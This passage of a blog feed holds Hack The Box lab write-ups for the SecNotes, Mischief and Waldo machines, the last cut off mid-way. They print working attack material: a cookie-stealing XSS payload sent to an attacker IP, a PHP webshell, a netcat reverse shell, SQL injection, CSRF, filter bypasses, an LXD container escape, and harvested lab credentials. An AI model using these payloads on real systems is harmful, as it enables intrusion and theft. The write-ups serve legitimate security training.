    "content": "This blog post is a writeup of the Hack the Box SecNotes machine from 0xdf.Windows / 10.10.10.97Summary  The box runs a PHP application on an IIS server.  There is a 2nd order SQL injection in the registration page which allows us to dump all the notes from the database. There is also a CSRF that we can leverage to reset the application password by sending a malicous link to a user through the Contact Us form.  One of the note contains the credentials for user Tyler.  Using the Tyler credentials, we can read/write files from the new-site share, which lets us upload a PHP webshell to the IIS site running on port 8808.  We can then get a shell by either uploading and running nc.exe or using a nishang poweshell oneliner, gaining an initial shell as user Tyler on the system. I had trouble getting output from bash using nishang so I eventually had to use netcat instead of nishang.  Enumerating the box, we find that the Linux Subsystem is installed.  After launching bash, we find in .bash_history the credentials for the Administrator user.Detailed stepsNmap scanOnly 3 ports are open, this should make the initial enumeration a bit easier.  IIS port 80  IIS port 8808  SMB port 445root@darkisland:~# nmap -sC -sV -p- 10.10.10.97Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-25 15:10 EDTNmap scan report for 10.10.10.97Host is up (0.015s latency).Not shown: 65532 filtered portsPORT     STATE SERVICE      VERSION80/tcp   open  http         Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Secure Notes - Login|_Requested resource was login.php445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)8808/tcp open  http         Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS WindowsService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h15m41s, deviation: 4h02m31s, median: -4m19s| smb-os-discovery: |   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)|   OS CPE: cpe:/o:microsoft:windows_10::-|   Computer name: SECNOTES|   NetBIOS computer name: SECNOTES\\x00|   Workgroup: HTB\\x00|_  System time: 2018-08-25T12:12:28-07:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2018-08-25 15:12:26|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 394.23 secondsWeb enumeration  Port 80 runs a custom SecNotes application  Port 8808 doesn‚Äôt have anything on it, except the default IIS page (tried enumerating with gobuster and didn‚Äôt find anything)Finding #1: We can enumerate user accountsThe box tells us whether or not a username exists when we attempt to log in.I tried fuzzing different usernames with wfuzz but only found the Tyler username which we already know from the SecNotes application page:wfuzz -z file,names.txt -d \"username=FUZZ&amp;password=1\" --hs \"No account found with that username\" http://10.10.10.97/login.phpFinding #2: Reflected XSS on the main login pageThe HTML page returns the username when authentication fails and the input is not properly sanitized so we can trigger an XXSExample payload in the username field: \"&gt;&lt;script&gt;alert(1);&lt;/script&gt;But we won‚Äôt be able to do anything useful with this since only our own user sees the error.Finding #3: Stored XSS in the notes applicationsThe notes application doesn‚Äôt escape any of the input data so we can embed javascript in the notes and attempt to steal cookies. Unfortunately there is no other user connecting and checking the notes so this is not useful for us here (we can‚Äôt steal session cookies of a logged on user).Payload: &lt;script&gt;document.write('&lt;img src=\"http://10.10.14.23:80/collect.gif?cookie=' + document.cookie + '\" /&gt;')&lt;/script&gt;Finding #4: 2nd order SQL injection on the registration pageThere‚Äôs an SQL injection vulnerability on the home.php page that we can abuse by creating a user with the following name: test' or 1=1-- -Once we log in after, the notes page will display all the notes from all users. The resulting query probably ends up being something like SELECT * FROM notes WHERE user = 'test' OR 1=1 so that basically returns all the notes because of the TRUE condition.One of the notes contains the credentials for the Tyler user.Finding #5: We can have Tyler change his password by sending him a linkThe Change Password page works through a POST request but it also works if we use a GET request instead.We can send messages to Tyler through the Contact Us form and he‚Äôll click on every link that we send him. Because there is no anti-CSRF token on the Change Password page, we can trick Tyler in changing his password.Initially, I tried sending an HTML link such as:&lt;a href=\"http://10.10.10.97/change_pass.php?password=test11&amp;confirm_password=test11&amp;submit=submit\"&gt;Click this!&lt;/a&gt; but it didn‚Äôt work.However plaintext works: http://10.10.10.97/change_pass.php?password=test11&amp;confirm_password=test11&amp;submit=submit.So we send this to Tyler and we can log in after with the password we specified in the link.User shellThe credentials for Tyler are in one of the notes:\\\\secnotes.htb\\new-sitetyler / 92g!mA8BGjOirkL%OG*&amp;Let‚Äôs verify which shares he has access to:root@darkisland:~/tmp# smbclient -U tyler -L //10.10.10.97WARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\tyler's password: \tSharename       Type      Comment\t---------       ----      -------\tADMIN$          Disk      Remote Admin\tC$              Disk      Default share\tIPC$            IPC       Remote IPC\tnew-site        Disk      root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-siteWARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\tyler's password: Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Sun Aug 19 14:06:14 2018  ..                                  D        0  Sun Aug 19 14:06:14 2018  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018\t\t12978687 blocks of size 4096. 7919013 blocks availableSo the new-site share is the root directory of the webserver listening on port 8808.To get a shell on the box we‚Äôll do the following:  Upload a PHP webshell  Upload netcat  Run netcat through the webshellAlternatively we could run nishang to get a reverse shell, but I had problem running bash and getting the output so netcat it is.Webshell:&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"&gt;&lt;INPUT TYPE=\"text\" NAME=\"cmd\"&gt;&lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?phpif($_GET['cmd']) {  system($_GET['cmd']);  }?&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-siteWARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\tyler's password: Try \"help\" to get a list of possible commands.smb: \\&gt; pwdCurrent directory is \\\\10.10.10.97\\new-site\\smb: \\&gt; ls  .                                   D        0  Sun Aug 19 14:06:14 2018  ..                                  D        0  Sun Aug 19 14:06:14 2018  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018\t\t12978687 blocks of size 4096. 7919013 blocks availablesmb: \\&gt; put snowscan.phpputting file snowscan.php as \\snowscan.php (1.6 kb/s) (average 1.6 kb/s)smb: \\&gt; put nc.exeputting file nc.exe as \\nc.exe (152.5 kb/s) (average 91.8 kb/s)Trigger the netcat connection with: http://secnotes.htb:8808/snowscan.php?cmd=nc+-e+cmd.exe+10.10.14.23+4444root@darkisland:~/tmp# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.97] 49757Microsoft Windows [Version 10.0.17134.228](c) 2018 Microsoft Corporation. All rights reserved.C:\\inetpub\\new-site&gt;whoamiwhoamisecnotes\\tylerC:\\inetpub\\new-site&gt;type c:\\users\\tyler\\desktop\\user.txttype c:\\users\\tyler\\desktop\\user.txt6fa755&lt;redacted&gt;PrivescAfter looking around the box for a bit, I found that the Linux subsystem is installed. I noticed a Distros directory, Ubuntu then found bash.exe in C:\\Windows\\System32.C:\\&gt;dir06/21/2018  03:07 PM    &lt;DIR&gt;          Distros[...]C:\\Distros\\Ubuntu&gt; Volume in drive C has no label. Volume Serial Number is 9CDD-BADA Directory of C:\\Distros\\Ubuntu06/21/2018  05:59 PM    &lt;DIR&gt;          .06/21/2018  05:59 PM    &lt;DIR&gt;          ..07/11/2017  06:10 PM           190,434 AppxBlockMap.xml07/11/2017  06:10 PM             2,475 AppxManifest.xml06/21/2018  03:07 PM    &lt;DIR&gt;          AppxMetadata07/11/2017  06:11 PM            10,554 AppxSignature.p7x06/21/2018  03:07 PM    &lt;DIR&gt;          Assets06/21/2018  03:07 PM    &lt;DIR&gt;          images07/11/2017  06:10 PM       201,254,783 install.tar.gz07/11/2017  06:10 PM             4,840 resources.pri06/21/2018  05:51 PM    &lt;DIR&gt;          temp07/11/2017  06:10 PM           222,208 ubuntu.exe07/11/2017  06:10 PM               809 [Content_Types].xml               7 File(s)    201,686,103 bytes               6 Dir(s)  32,431,472,640 bytes freeC:\\Windows\\System32&gt;dir bash.exe06/21/2018  02:02 PM           115,712 bash.exeAfter starting bash and looking around the system, we find the Administrator credentials in root‚Äôs .bash_history file:C:\\Windows\\System32&gt;bashmesg: ttyname failed: Inappropriate ioctl for devicepython -c 'import pty;pty.spawn(\"/bin/bash\")'root@SECNOTES:~# cat .bash_historycat .bash_historycd /mnt/c/lscd Users/cd /cd ~lspwdmkdir filesystemmount //127.0.0.1/c$ filesystem/sudo apt install cifs-utilsmount //127.0.0.1/c$ filesystem/mount //127.0.0.1/c$ filesystem/ -o user=administratorcat /proc/filesystemssudo modprobe cifssmbclientapt install smbclientsmbclientsmbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\\\\\127.0.0.1\\\\c$&gt; .bash_history less .bash_historyWe can then psexec as administrator and get the root flag:root@darkstar:~# /usr/share/doc/python-impacket/examples/psexec.py 'administrator:u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97 cmd.exeImpacket v0.9.17 - Copyright 2002-2018 Core Security Technologies[*] Requesting shares on 10.10.10.97.....[*] Found writable share ADMIN$[*] Uploading file DmaHNXRy.exe[*] Opening SVCManager on 10.10.10.97.....[*] Creating service twnE on 10.10.10.97.....[*] Starting service twnE.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17134.228](c) 2018 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32&gt;type c:\\users\\administrator\\desktop\\root.txt7250cd&lt;redacted&gt;"
  },
  
  {
    "title": "Mischief - Hack The Box",
    "url": "/posts/htb-writeup-mischief/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, linux, lxc, containers, unintended",
    "date": "2019-01-05 00:00:00 +0800",
    





    
    "snippet": "This blog post is a writeup of the Mischief machine from Hack the Box using the unintended LXC container privesc method.Linux / 10.10.10.92Summary  SNMP is enabled and the default public SNMP commu...",
    "content": "This blog post is a writeup of the Mischief machine from Hack the Box using the unintended LXC container privesc method.Linux / 10.10.10.92Summary  SNMP is enabled and the default public SNMP community string is configured  Using SNMP, we find that a Python SimpleHTTPServer is running with basic authentication, the credentials are passed as command arguments so we can see those in the snmpwalk  The webserver is running on port 3366 and we can log in with the credentials we found  There is another set of credentials displayed on the webpage but we don‚Äôt know what these are for yet  Using SNMP, we find there is an IPv6 address configured on the server and nmap shows an Apache server running on port 80  We can log in to the webserver with the password we found on the other page, we just have to guess/bruteforce the username which is administrator  There‚Äôs a command injection vulnerability on the PHP page that we can exploit to read a credentials file in the loki home directory  We can log in with SSH as user loki now and we see that we are part of the lxd group  We can priv esc by uploading a container, setting it as privileged and mounting the local filesystem within the container  The root.txt flag in /root is a fake one, but doing a find command on the entire filesystem reveals it‚Äôs real locationTools/Blogs used  http://docwiki.cisco.com/wiki/How_to_get_IPv6_address_via_SNMP  https://dominicbreuker.com/post/htb_calamity/Detailed stepsNmapThere‚Äôs only a webserver and the SSH service running on this boxroot@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sC -sV -p- 10.10.10.92Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 18:57 EDTNmap scan report for 10.10.10.92Host is up (0.015s latency).Not shown: 65533 filtered portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)| http-auth: | HTTP/1.0 401 Unauthorized\\x0D|_  Basic realm=Test|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 127.89 secondsSNMP reconSNMP is open on UDP port 161root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sU -F 10.10.10.92Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:07 EDTNmap scan report for 10.10.10.92Host is up (0.014s latency).Not shown: 99 open|filtered portsPORT    STATE SERVICE161/udp open  snmpNmap done: 1 IP address (1 host up) scanned in 3.03 secondsSNMP is using the default public community string:root@violentunicorn:~/hackthebox/Machines/Mischief# onesixtyone 10.10.10.92Scanning 1 hosts, 2 communities10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64We can get the list of processes with this nmap script, or by doing an snmpwalk:root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sU -p 161 --script=snmp-processes 10.10.10.92Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:15 EDTNmap scan report for 10.10.10.92Host is up (0.014s latency).PORT    STATE SERVICE161/udp open  snmp| snmp-processes:[...]|   631: |     Name: python|     Path: python|     Params: -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/[...]We found some credentials in there: loki / godofmischiefislokiCredentials found on the webserverWe can now log in to the webserver with the found credentials:On the page we see an image of Loki and two sets of credentials:  loki / godofmischiefisloki  loki / trickeryanddeceitWe already have the first one, we need to find where to use the 2nd one.The trickeryanddeceit password doesn‚Äôt work on SSH (tried bruteforcing usernames also)SNMP recon (part 2)When we do a full snmpwalk, we pickup IPv6 addresses configured on the interface:root@violentunicorn:~/hackthebox/Machines/Mischief# snmpwalk -v2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.92 = INTEGER: 2iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.178.24.116 = INTEGER: 2iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.178.24.116 = INTEGER: 2We convert that to hex using a python script:&gt;&gt;&gt; s = \"222.173.190.239.0.0.0.0.2.80.86.255.254.178.24.116\"&gt;&gt;&gt; s = s.split(\".\")&gt;&gt;&gt; ip = \"\"&gt;&gt;&gt; for i in s:...     ip += hex(int(i))[2:].rjust(2,'0')... &gt;&gt;&gt; print ipdeadbeef00000000025056fffeb21874IPv6 address: dead:beef:0000:0000:0250:56ff:feb2:1874We‚Äôll add this IPv6 address to our /etc/hosts.Nmap IPv6There is another webserver running on port 80 but only listening on IPv6 addresses:root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -6 -sC -sV -p- dead:beef:0000:0000:0250:56ff:feb2:1874Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:29 EDTNmap scan report for dead:beef::250:56ff:feb2:1874Host is up (0.015s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 400 Bad RequestService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| address-info: |   IPv6 EUI-64: |     MAC address: |       address: 00:50:56:b2:18:74|_      manuf: VMwareService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.58 secondsCommand execution panelThe web server is running a PHP application:It‚Äôs probably using the 2nd password we found but we don‚Äôt know the username (loki doesn‚Äôt work here.)We‚Äôll use Hydra to bruteforce the username:root@violentunicorn:~/hackthebox/Machines/Mischief# hydra -I -L /root/SecLists/Usernames/top_shortlist.txt -p trickeryanddeceit mischief http-post-form \"/login.php:user=^USER^&amp;password=^PASS^:credentials do not match\"Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2018-07-08 19:37:12[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:11/p:1), ~1 try per task[DATA] attacking http-post-form://mischief:80//login.php:user=^USER^&amp;password=^PASS^:credentials do not match[80][http-post-form] host: mischief   login: administrator   password: trickeryanddeceit1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2018-07-08 19:37:13Username is: administratorOnce logged in we see:There‚Äôs a hint about a credentials file in the home directory.The command input is filtered (some commands are blacklisted.)But we can get the credentials with: ping -c 2 127.0.0.1; cat /home/loki/c*;Password is lokiisthebestnorsegodWe can now SSH with user loki and password lokiisthebestnorsegodroot@violentunicorn:~/hackthebox/Machines/Mischief# ssh loki@10.10.10.92loki@10.10.10.92's password: Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)[...]loki@Mischief:~$ cat user.txtbf5807&lt;redacted&gt;Privesc (unintended method)Our low privilege user is part of the lxd group:loki@Mischief:~$ iduid=1000(loki) gid=1004(loki) groups=1004(loki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),1000(lpadmin),1001(sambashare),1002(debian-tor),1003(libvirtd)So that means we can configure and manage LXC containers on the system.First, we‚Äôll initialize LXD on the box and create a storage pool:loki@Mischief:~$ lxd initWould you like to use LXD clustering? (yes/no) [default=no]: Do you want to configure a new storage pool? (yes/no) [default=yes]: Name of the new storage pool [default=default]: Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: Create a new BTRFS pool? (yes/no) [default=yes]: Would you like to use an existing block device? (yes/no) [default=no]: Size in GB of the new loop device (1GB minimum) [default=15GB]: 8Would you like to connect to a MAAS server? (yes/no) [default=no]: Would you like to create a new network bridge? (yes/no) [default=yes]: noWould you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: Would you like LXD to be available over the network? (yes/no) [default=no]: Would you like stale cached images to be updated automatically? (yes/no) [default=yes] Would you like a YAML \"lxd init\" preseed to be printed? (yes/no) [default=no]:Next, we‚Äôll upload a ubuntu container image that we‚Äôve created on another machine (see: https://dominicbreuker.com/post/htb_calamity/)root@violentunicorn:~/mischief# scp ubuntu.tar.gz loki@10.10.10.92:loki@10.10.10.92's password: ubuntu.tar.gz           Then import it, create a new container out of it, configure it as privileged and mount the local filesystem into it:loki@Mischief:~$ lxc image import ubuntu.tar.gz  --alias yoloImage imported with fingerprint: 65d3db52d47d12928e8392004207269d1d8d542024b64e1b2c638a7e1c19e42dloki@Mischief:~$ lxc init yolo yolo -c security.privileged=trueCreating yoloThe container you are starting doesn't have any network attached to it.  To create a new network, use: lxc network create  To attach a network to a container, use: lxc network attachloki@Mischief:~$ lxc config device add yolo mydevice disk source=/ path=/mnt/root recursive=trueDevice mydevice added to yoloNext we start the container and execute a bash shell:loki@Mischief:~$ lxc config device add yolo mydevice disk source=/ path=/mnt/root recursive=trueDevice mydevice added to yololoki@Mischief:~$ lxc start yololoki@Mischief:~$ lxc exec yolo /bin/bashroot@yolo:~# cd /mnt/root/rootroot@yolo:/mnt/root/root# lsroot.txtroot@yolo:/mnt/root/root# cat root.txtThe flag is not here, get a shell to find it!Looks like the flag is hidden somewhere else‚Ä¶Let‚Äôs find it:root@yolo:/mnt/root/root# find /mnt/root -name root.txt 2&gt;/dev/null/mnt/root/usr/lib/gcc/x86_64-linux-gnu/7/root.txt/mnt/root/root/root.txtThere‚Äôs another root.txt, let‚Äôs see‚Ä¶root@yolo:/mnt/root/root# cat /mnt/root/usr/lib/gcc/x86_64-linux-gnu/7/root.txtae155f&lt;redacted&gt;Game over!"
  },
  
  {
    "title": "Waldo - Hack The Box",
    "url": "/posts/htb-writeup-waldo/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, linux, capabilities, php",
    "date": "2018-12-15 00:00:00 +0800",
    





    
    "snippet": "Linux / 10.10.10.87This blog post is a writeup of the Waldo machine from Hack the Box.Summary  The webserver has a vulnerable function that can be used to browse directories and read files  We can ...",
    "content": "Linux / 10.10.10.87This blog post is a writeup of the Waldo machine from Hack the Box.Summary  The webserver has a vulnerable function that can be used to browse directories and read files  We can read the SSH private key from the nobody user home directory and log in as nobody  We‚Äôre within a container but we can log in with SSH as user monitor to the host (127.0.0.1)  There‚Äôs a logMonitor application running with elevated capabilities (it can read log files even if not running as root)  This is a hint that we should be looking at capabilities of files (cap_dac_read_search+ei)  We look at the entire filesystem for files with special cap‚Äôs and we find that the tac application has that capabily and we can read /root/root.txtDetailed stepsNmapThere‚Äôs only a webserver and an SSH service running on this boxroot@darkisland:~# nmap -sC -sV -p- 10.10.10.87Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-04 21:08 EDTNmap scan report for waldo.htb (10.10.10.87)Host is up (0.018s latency).Not shown: 65532 closed portsPORT     STATE    SERVICE        VERSION22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)| ssh-hostkey: |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)80/tcp   open     http           nginx 1.12.2|_http-server-header: nginx/1.12.2| http-title: List Manager|_Requested resource was /list.html|_http-trane-info: Problem with XML parsing of /evox/about8888/tcp filtered sun-answerbookService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.87 secondsWeb enumerationThe webpage is a simple application that displays and manages ‚Äúlists‚Äù, and is using Javascript/Ajax.In the javascript source code (list.js), the readFile function can be abused to read source code of other PHP files in the directory:function readFile(file){   var xhttp = new XMLHttpRequest();  xhttp.open(\"POST\",\"fileRead.php\",false);  xhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");  xhttp.send('file=' + file);  if (xhttp.readyState === 4 &amp;&amp; xhttp.status === 200) {    return xhttp.responseText;  }else{  }}The various files we read are:  fileRead.php  fileWrite.php  fileDelete.php  dirRead.phpThe first thing I tried was to use fileWrite to write an arbitrary PHP file in the .list directory but the filename is derived from the listnum parameter which is checked to make sure it‚Äôs numeric (PHP‚Äôs is_numeric() function). So we can‚Äôt write files with the appropriate extension and execute code.Next, I looked at the dirRead.php file to try to enumerate the file system. The function uses a str_array filter to replace characters that could be used for path traversal: str_replace(array(\"../\", \"..\\\"), \"\", $_POST['path'])So something like ../../../../../ will get replaced with an empty string which is going to default to the current directory.We can verify with using the interactive PHP interpreter:root@darkisland:~# php -aInteractive mode enabledphp &gt; php &gt; echo str_replace( array(\"../\", \"..\\\\\"), \"\", array(\"../../../../\"))[0];php &gt;php &gt; echo str_replace( array(\"../\", \"..\\\\\"), \"\", array(\"this_is_not_blacklisted\"))[0];this_is_not_blacklistedWe can bypass the filter by using the following sequence: ....//....//....//....//php &gt; echo str_replace( array(\"../\", \"..\\\\\"), \"\", array(\"....//....//....//....//\"))[0];../../../../Running it on the target system, we are able to navigate to the user directory:The .monitor file looks interesting, we‚Äôll use the fileRead.php function to read it:Initial shell accessUsing the SSH private key we obtained, we can log in as user nobody:root@darkisland:~/hackthebox/Machines/Waldo# ssh -i waldo.key nobody@10.10.10.87Welcome to Alpine!The Alpine Wiki contains a large amount of how-to guides and generalinformation about administrating Alpine systems.See &lt;http://wiki.alpinelinux.org&gt;.waldo:~$ lsuser.txtwaldo:~$ cat user.txt32768b&lt;redacted&gt;Pivoting to the host OS and privescThere isn‚Äôt much else we can do as user nobody since we are in a container.We can however pivot to the host OS by re-using the same key and logging in as user monitor:waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:YHb7KyiwRxyN62du1P80KmeA9Ap50jgU6JlRaXThs/M.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64           &amp;.                                                                            @@@,@@/ %                                                                   #*/%@@@@/.&amp;@@,                                                             @@@#@@#&amp;@#&amp;#&amp;@@@,*%/                                                           /@@@&amp;###########@@&amp;*(*                                                       (@################%@@@@@.     /**                                              @@@@&amp;#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                                %@@@@%##########&amp;@@@....                 .#%#@@@@@@@#                          @@&amp;%#########@@@@/                        */@@@%(((@@@%                           @@@#%@@%@@@,                       *&amp;@@@&amp;%(((#((((@@(                           /(@@@@@@@                     *&amp;@@@@%((((((((((((#@@(                            %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&amp;#,                      %@*(@#%@.,       /@@@@&amp;(((((((((((((((&amp;@@@@@@&amp;#######%%@@@@#    &amp;            *@@@@@#        .&amp;@@@#(((#(#((((((((#%@@@@@%###&amp;@@@@@@@@@&amp;%##&amp;@@@@@@/          /@@          #@@@&amp;#(((((((((((#((@@@@@%%%%@@@@%#########%&amp;@@@@@@@@&amp;           *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&amp;@@@@@@@&amp;        %@/ .&amp;%@@%#(((((((((((((((#@@@@@@@&amp;#####%@@@%#############%@@@&amp;%##&amp;@@/         @@@@@@%(((((((((((##(((@@@@&amp;%####%@@@%#####&amp;@@@@@@@@@@@@@@@&amp;##&amp;@@@@@@@@@/     @@@&amp;(((#((((((((((((#@@@@@&amp;@@@@######@@@###################&amp;@@@&amp;#####%@@*      @@#(((((((((((((#@@@@%&amp;@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@     *@@%((((((((#@@@@@@@%#&amp;@@,,.,,.&amp;@@@#####################%@@@@@@%######&amp;@@.       @@@#(#&amp;@@@@@&amp;##&amp;@@@&amp;#@@/,,,,,,,,@@@&amp;######&amp;@@@@@@@@&amp;&amp;%######%@@@@@@@@@@@        @@@@@@&amp;%&amp;@@@%#&amp;@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&amp;@@%&amp;@@@@@@&amp;%#####%@@@@.          .@@@###&amp;@@@%%@(,,,%@&amp;,.,,,,,,,,,,,,,.*&amp;@@@@&amp;(,*@&amp;#@%%@@@@@@@@@@@@*               @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&amp;@@@@(&amp;@&amp;@&amp;@@@@(                       .@@&amp;##@@,,/@@@@&amp;(.  .&amp;@@@&amp;,,,.&amp;@@/         #@@%@@@@@&amp;@@@/                     *@@@@@&amp;@@.*@@@          %@@@*,&amp;@@            *@@@@@&amp;.#/,@/                    *@@&amp;*#@@@@@@@&amp;     #@(    .@@@@@@&amp;    ,@@@,    @@@@@(,@/@@                     *@@/@#.#@@@@@/    %@@@,   .@@&amp;%@@@     &amp;@&amp;     @@*@@*(@@#                       (@@/@,,@@&amp;@@@            &amp;@@,,(@@&amp;          .@@%/@@,@@                           /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#                             %@@.%@&amp;,(@@@@,  /&amp;@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,                              ,@@,&amp;@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&amp;@                                &amp;@,*@@.,,,,,..,,,,&amp;@@%/**/@@*,,,,,&amp;(.,,,.@@,,@@                                /@%,&amp;@/,,,,/@%,,,,,*&amp;@@@@@#.,,,,,.@@@(,,(@@@@@(                                 @@*,@@,,,#@@@&amp;*..,,,,,,,,,,,,/@@@@,*(,,&amp;@/#*                                   *@@@@@(,,@*,%@@@@@@@&amp;&amp;#%@@@@@@@/,,,,,,,@@                                           @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&amp;@,                                            @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                                             &amp;@&amp;,,,,,,,,,,,,,,,,,,,,,,,,,,,,&amp;@#                                              %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                                               ,@@,,,,,,,,@@@&amp;&amp;&amp;%&amp;@,,,,,..,,@@,                                                *@@,,,,,,,.,****,..,,,,,,,,&amp;@@                                                  (@(,,,.,,,,,,,,,,,,,,.,,,/@@                                                   .@@,,,,,,,,,,,,,...,,,,,,@@                                                     ,@@@,,,,,,,,,,,,,,,,.(@@@                                                        %@@@@&amp;(,,,,*(#&amp;@@@@@@,                                                               Here's Waldo, where's root?Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1-rbash: alias: command not foundIt seems we are in a restricted bash shell since we can‚Äôt run arbitrary comands:monitor@waldo:~$ cd /-rbash: cd: restrictedmonitor@waldo:~$ lsapp-dev  